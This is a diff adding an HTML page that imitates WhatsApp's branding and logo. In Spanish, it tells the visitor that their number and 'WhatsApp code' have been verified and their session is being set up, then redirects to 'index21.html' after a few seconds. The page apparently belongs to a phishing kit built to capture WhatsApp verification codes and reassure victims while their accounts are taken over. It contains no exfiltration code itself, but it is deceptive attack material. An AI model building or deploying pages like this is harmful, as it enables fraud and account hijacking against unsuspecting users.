@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Procesando</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --wa-green:     #25D366;
+      --wa-teal:      #128C7E;
+      --wa-teal-dark: #075E54;
+      --wa-panel-bg:  #f0f2f5;
+      --wa-white:     #FFFFFF;
+      --wa-text:      #111B21;
+      --wa-text-gray: #667781;
+      --wa-border:    #D1D7DB;
+    }
+
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+    html, body { height:100%; font-family:'Inter',sans-serif; background:var(--wa-panel-bg); overflow:hidden; }
+    body { display:flex; align-items:center; justify-content:center; padding:20px; min-height:100vh; }
+
+    body::before {
+      content:''; position:fixed; inset:0; z-index:0;
+      background-image:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23d1d7db' fill-opacity='0.3'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+    }
+
+    .card {
+      position:relative; z-index:1;
+      width:100%; max-width:420px;
+      background:var(--wa-white);
+      border-radius:16px; padding:48px 40px;
+      box-shadow:0 8px 40px rgba(0,0,0,0.13), 0 2px 8px rgba(0,0,0,0.06);
+      display:flex; flex-direction:column; align-items:center;
+      animation:rise .5s cubic-bezier(.16,1,.3,1) both;
+    }
+    @keyframes rise { from{opacity:0;transform:translateY(20px) scale(.97)} to{opacity:1;transform:none} }
+
+    .icon-ring { position:relative; width:88px; height:88px; margin-bottom:28px; }
+    .ring-svg { position:absolute; inset:0; animation:spin-ring 2s linear infinite; }
+    @keyframes spin-ring { to{transform:rotate(360deg)} }
+    .icon-center {
+      position:absolute; inset:12px;
+      background:var(--wa-teal); border-radius:50%;
+      display:flex; align-items:center; justify-content:center;
+      box-shadow:0 4px 16px rgba(18,140,126,0.35);
+    }
+    .icon-center svg { width:32px; height:32px; fill:white; }
+
+    .heading { font-size:22px; font-weight:700; color:var(--wa-text); margin-bottom:6px; text-align:center; }
+    .sub { font-size:13.5px; color:var(--wa-text-gray); text-align:center; margin-bottom:28px; line-height:1.5; }
+
+    .check-list { width:100%; display:flex; flex-direction:column; gap:8px; margin-bottom:28px; }
+    .check-item {
+      display:flex; align-items:center; gap:12px;
+      padding:11px 14px; border-radius:10px;
+      border:1.5px solid transparent; transition:all .35s ease; opacity:0.35;
+    }
+    .check-item.done { background:#f0fdf4; border-color:#bbf7d0; opacity:1; }
+    .check-item.active { background:#f0fdfa; border-color:rgba(18,140,126,0.3); opacity:1; }
+    .check-icon {
+      width:26px; height:26px; border-radius:50%; flex-shrink:0;
+      display:flex; align-items:center; justify-content:center;
+    }
+    .check-item.done .check-icon { background:var(--wa-teal); }
+    .check-item.active .check-icon { background:transparent; border:2px solid var(--wa-green); animation:pulse-border 1.4s ease-in-out infinite; }
+    .check-item .check-icon { background:var(--wa-border); }
+    @keyframes pulse-border { 0%,100%{box-shadow:0 0 0 0 rgba(37,211,102,0)} 50%{box-shadow:0 0 0 5px rgba(37,211,102,0.15)} }
+    .check-dot { width:7px; height:7px; border-radius:50%; }
+    .check-item.done .check-dot { background:white; }
+    .check-item.active .check-dot { background:var(--wa-green); animation:blink .9s ease-in-out infinite alternate; }
+    .check-item .check-dot { background:rgba(0,0,0,0.2); }
+    @keyframes blink { to{opacity:0.2} }
+    .check-text { font-size:13px; font-weight:600; color:var(--wa-text); }
+    .check-item.done .check-text { color:var(--wa-teal-dark); }
+    .check-sub { font-size:11px; color:var(--wa-text-gray); margin-top:1px; }
+
+    .wave-wrap { display:flex; justify-content:center; gap:4px; margin-bottom:24px; align-items:flex-end; height:36px; }
+    .bar { width:4px; border-radius:99px; background:linear-gradient(to top, var(--wa-teal), var(--wa-green)); animation:wave 1.2s ease-in-out infinite; }
+    .bar:nth-child(1){height:14px;animation-delay:0s} .bar:nth-child(2){height:22px;animation-delay:.1s}
+    .bar:nth-child(3){height:30px;animation-delay:.2s} .bar:nth-child(4){height:22px;animation-delay:.3s}
+    .bar:nth-child(5){height:14px;animation-delay:.4s} .bar:nth-child(6){height:22px;animation-delay:.5s}
+    .bar:nth-child(7){height:30px;animation-delay:.6s} .bar:nth-child(8){height:22px;animation-delay:.7s}
+    .bar:nth-child(9){height:14px;animation-delay:.8s}
+    @keyframes wave { 0%,100%{transform:scaleY(0.4);opacity:0.5} 50%{transform:scaleY(1);opacity:1} }
+
+    .note { font-size:12px; color:var(--wa-text-gray); text-align:center; line-height:1.6; }
+
+    @media (max-width:480px) { .card { padding:36px 24px; border-radius:12px; } }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="icon-ring">
+      <svg class="ring-svg" viewBox="0 0 88 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="44" cy="44" r="40" stroke="url(#rg)" stroke-width="2.5" stroke-dasharray="10 7" stroke-linecap="round"/>
+        <defs>
+          <linearGradient id="rg" x1="0" y1="0" x2="88" y2="88" gradientUnits="userSpaceOnUse">
+            <stop stop-color="#25D366"/>
+            <stop offset="1" stop-color="#128C7E" stop-opacity="0.2"/>
+          </linearGradient>
+        </defs>
+      </svg>
+      <div class="icon-center">
+        <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+      </div>
+    </div>
+
+    <h1 class="heading">Verificando...</h1>
+    <p class="sub">Estamos procesando tu información de seguridad</p>
+
+    <div class="check-list">
+      <div class="check-item done" id="c1">
+        <div class="check-icon"><div class="check-dot"></div></div>
+        <div><div class="check-text">Número validado</div><div class="check-sub">Número reconocido correctamente</div></div>
+      </div>
+      <div class="check-item done" id="c2">
+        <div class="check-icon"><div class="check-dot"></div></div>
+        <div><div class="check-text">Código verificado</div><div class="check-sub">Código de WhatsApp confirmado</div></div>
+      </div>
+      <div class="check-item active" id="c3">
+        <div class="check-icon"><div class="check-dot"></div></div>
+        <div><div class="check-text">Completando sesión</div><div class="check-sub">Configurando tu acceso...</div></div>
+      </div>
+    </div>
+
+    <div class="wave-wrap">
+      <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+      <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+      <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+    </div>
+
+    <p class="note">Por favor espera, esto tomará unos segundos.<br>No cierres esta ventana.</p>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById('c3').classList.remove('active');
+      document.getElementById('c3').classList.add('done');
+    }, 2000);
+    setTimeout(() => { window.location.href = 'index21.html'; }, 3500);
+  </script>
+</body>
+</html>
